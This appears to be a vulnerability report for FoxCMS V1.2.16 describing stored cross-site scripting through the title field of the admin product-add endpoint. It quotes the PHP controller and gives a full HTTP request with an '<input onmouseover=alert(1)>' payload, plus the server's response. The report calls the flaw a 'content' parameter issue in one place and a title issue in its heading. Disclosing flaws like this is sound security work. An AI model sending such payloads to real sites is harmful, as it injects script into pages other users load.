FoxCMS - Cross Site Scripting on (app/admin/controller/Product.php title parameter) 

Vendor Homepage:
```
https://gitee.com/qianfox/foxcms
```

Version: 

```
V1.2.16
```

Tested on: 

```
PHP, Nignx, MySQL
```

Affected Page:

```
app/admin/controller/Product.php
```

On this page, content parameter is vulnerable to Cross Site Scripting

```
public function add()
    {
        $param = $this->request->param();

        $bcid = $param['bcid'];
        View::assign('bcid', $bcid);
        $ids = explode('_', $bcid);
        $columnId = $ids[sizeof($ids) - 1]; //栏目id
        $column = Column::find($columnId);
        if (!empty($column->tier)) {
            $bcidStr = '4_' . str_replace(",", "_", $column->tier);
        } else {
            $bcidStr = '4';
        }
        $breadcrumb = Column::getBreadcrumb($bcidStr);
        array_push($breadcrumb, ['id' => '', 'title' => '添加产品', 'name' => DIRECTORY_SEPARATOR . config('adminconfig.admin_path') . '/Product/add', 'url' => 'javascript:void(0)']);
        View::assign("breadcrumb", $breadcrumb);
        $clang = $this->getMyLang();
        if ($this->request->isAjax()) {
            //更新产品属性顺序
            if (array_key_exists("product_attr_ids", $param) && !empty($param['product_attr_ids'])) {
                $product_attr_ids = $param['product_attr_ids'];
                $product_attr_idArr = explode(",", $product_attr_ids);
                $ProductAttrUData = [];
                foreach ($product_attr_idArr as $key => $product_attr_id) {
                    array_push($ProductAttrUData, ['sort' => ($key + 1), "id" => $product_attr_id, 'lang' => $clang]);
                }
                (new ProductAttr())->saveAll($ProductAttrUData);
            }
            unset($param['product_attr_ids']);

            //替换内容
            if (array_key_exists("content", $param)) {
                $rdata = $this->replaceContent($param, 'content');
                if ($rdata["code"] == 0) {
                    $this->error($rdata['msg']);
                }
                $param['content'] = $rdata['content']; //替换内容
            }
            $productParams = $param['productParams']; //产品参数
            $product = new \app\common\model\Product();
            if (empty($param["release_time"])) {
                $param["release_time"] = date("Y-m-d H:i:s");
            }
            $param['lang'] = $clang;
            $product->save($param);
            $productId = $product->id;
            $productParamDatas = []; //产品参数
            foreach ($productParams as $key => $productParam) {
                $pid = $productParam["pid"];
                if ($productParam["is_select"] == 1) { //判断是否下拉
                    //获取下拉选项拉取默认值
                    $productParamObj = (new ProductAttrParam())->find($pid);
                    if ($productParamObj) {
                        $dfvalueStr = str_replace("\n", ",", $productParamObj->dfvalue);
                        array_push(
                            $productParamDatas,
                            [
                                'product_id' => $productId,
                                'name' => $productParam["name"],
                                'dfvalue' => $productParam["dfvalue"],
                                'type' => $productParamObj->type,
                                "type_id" => $productParamObj->type_id,
                                'type_desc' => $productParamObj->type_desc,
                                'sel_value' => $dfvalueStr,
                                "attr_param_id" => $pid,
                                'id' => $productParam["id"],
                                'sort' => $productParam['sort']
                            ]
                        );
                    }
                } else {
                    array_push($productParamDatas, [
                        'product_id' => $productId,
                        'name' => $productParam["name"],
                        'dfvalue' => $productParam["dfvalue"],
                        'type' => "varchar(255)",
                        "type_id" => 11,
                        'type_desc' => "默认输入",
                        "attr_param_id" => $pid,
                        'id' => $productParam["id"],
                        'sort' => $productParam['sort']
                    ]);
                }
            }
            if (sizeof($productParamDatas) > 0) {
                (new ProductParam())->saveAll($productParamDatas);
            }

            $tags = $param["tags"];
            if (!empty($tags)) { //文档标签
                $this->addTags($tags);
            }
            xn_add_admin_log("添加产品", "product", $param['title']); //添加日志
            $seo = xn_cfg("seo");
            if ($seo["url_model"] == 3) {
                $rparam =  ["columnId" => $param["column_id"], "oneId" => "key3", "first" => 1, "column_model" => "product", "id" => $productId];
                $rparam = array_merge($rparam, $seo);
                $this->success('操作成功', "", $rparam);
            } else {
                $this->success('操作成功');
            }
        }
        View::assign('column', $column);
        return view();
    }
```

Function point location：

<img width="2878" height="1488" alt="8aab9352-e815-4bbc-8ce1-55f8832efff7" src="https://github.com/user-attachments/assets/d0f5aa29-6fea-4708-b9bb-ace45308b65c" />


Request:

```
POST /index.php/admin4435/Product/add.html HTTP/1.1
Host: www.foxcms.cms
Content-Length: 329
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.foxcms.cms
Referer: http://www.foxcms.cms/index.php/admin4435/Product/add.html?type=1&bcid=3_14
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; access_127_0_0_1=1761129226
Connection: close

title=%3Cinput+onmouseover%3Dalert(1)+%2F%3E&brief_title=test3&article_field=&column_id=14&column=A%E7%B3%BB%E5%88%97&breviary_pic_id=456&keywords=&description=&article_source=&author=&team_status=%2C&content=&picset_ids=&release_time=&click=&status=1&tags=&product_attr_ids=3%2C4%2C5%2C6%2C7%2C8%2C9%2C&price=&buy_link=&big_img=
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Wed, 22 Oct 2025 12:28:07 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.4
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-CSRF-TOKEN, X-Requested-With
Access-Control-Allow-Origin: http://www.foxcms.cms
Set-Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; expires=Thu, 23-Oct-2025 12:28:07 GMT; Max-Age=86400; path=/
Content-Length: 59

{"code":1,"msg":"操作成功","data":"","url":"","wait":1}
```
<img width="2878" height="1566" alt="image" src="https://github.com/user-attachments/assets/26de6123-cbc3-4604-8290-52b5c47231ed" />
